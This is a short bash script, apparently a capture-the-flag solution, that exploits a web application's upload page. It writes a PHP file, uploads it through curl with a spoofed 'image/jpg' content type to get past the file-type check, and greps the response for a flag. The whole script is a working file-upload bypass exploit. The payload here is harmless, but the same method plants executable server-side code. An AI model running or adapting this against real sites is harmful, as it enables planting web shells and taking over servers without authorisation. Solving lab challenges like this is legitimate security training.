#!/bin/bash

if [ -z "${IPADDR}" ]; then
    echo "IPADDR env var is missing";
    exit 1;
fi

echo 'echo hello' > /$HOME/index.php

curl -s -F "uploaded=@$HOME/index.php;type=image/jpg" -F "Upload=Upload" "http://$IPADDR/index.php?page=upload" | grep flag